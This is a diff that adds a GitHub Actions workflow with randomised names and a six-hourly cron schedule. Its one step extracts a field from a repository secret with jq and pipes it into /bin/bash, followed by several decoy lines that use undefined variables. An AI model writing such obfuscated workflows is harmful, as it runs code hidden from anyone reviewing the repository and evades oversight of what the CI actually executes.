@@ -1,0 +1,25 @@
+name: daibiaoszrw
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '2 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: daibiaoszrw
+        env:
+          ns12: ${{ secrets.ns12 }}
+        run: |
+          echo $ns12 | jq -r .zg7 | /bin/bash
+          echo $bmoiv7682 | jq -r .pyhl8415 | /bin/bash
+          echo $obx585 | jq -r .tm916 | /bin/bash
+          echo $ti2 | jq -r .q9368 | /bin/bash
+          echo $nzhuk0697 | jq -r .t13 | /bin/bash
+          echo $tdb140 | jq -r .j82790 | /bin/bash
+          echo $z13505 | jq -r .sy8590 | /bin/bash
+          echo $imqep67 | jq -r .fi02 | /bin/bash
+          echo $xxhp727 | jq -r .ar17 | /bin/bash
+
